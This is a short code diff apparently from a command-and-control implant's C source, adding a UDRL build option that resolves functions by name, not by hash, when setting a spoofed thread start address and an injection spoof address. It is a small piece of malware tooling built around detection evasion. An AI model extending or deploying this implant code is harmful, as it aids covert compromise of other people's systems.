@@ -1064,7 +1064,7 @@ VOID CommandFS( PPARSER Parser )
 
             if ( ! ( Return = Instance->Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) ) {
                 PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
-                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() ); 
+                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
             } else {
                 PackageAddWString( Package, Path );
             }
@@ -1897,7 +1897,11 @@ VOID CommandConfig( PPARSER Parser )
                 PRINTF( "hLib => %x\n", hLib );
 
                 if ( hLib ) {
+#ifdef UDRL
+                    ThreadAddr = LdrFunctionAddr( hLib,  Function );
+#else
                     ThreadAddr = LdrFunctionAddr( hLib, HashStringA( Function ) );
+#endif
                     if ( ThreadAddr ) {
                         Instance->Config.Implant.ThreadStartAddr = ThreadAddr + Offset;
                     }
@@ -1990,8 +1994,11 @@ VOID CommandConfig( PPARSER Parser )
 
                 if ( hLib )
                 {
+#ifdef UDRL
+                    ThreadAddr = LdrFunctionAddr( hLib, Function );
+#else
                     ThreadAddr = LdrFunctionAddr( hLib, HashStringA( Function ) );
-
+#endif
                     if ( ThreadAddr ) {
                         Instance->Config.Inject.SpoofAddr = ThreadAddr + Offset;
                     } else {
